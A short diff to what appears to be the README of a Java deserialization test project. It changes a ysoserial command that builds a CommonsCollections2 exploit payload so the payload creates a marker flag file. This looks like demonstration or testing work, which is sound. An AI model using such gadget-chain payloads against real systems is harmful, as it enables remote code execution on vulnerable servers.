@@ -27,7 +27,7 @@ Verify that `Simple_exploitedX.flag` is created.
 ## Commons Collections 4.0
 Generate the payload with ysoserial:
 ```
-java -jar ysoserial-all.jar CommonsCollections2 "touch newfile" > CommonsCollections2.touchfile.payload.bin
+java -jar ysoserial-all.jar CommonsCollections2 "touch CommonsCollections2_exploited.flag" > CommonsCollections2.touchfile.payload.bin
 ```
 
 Demonstrate the exploit with:
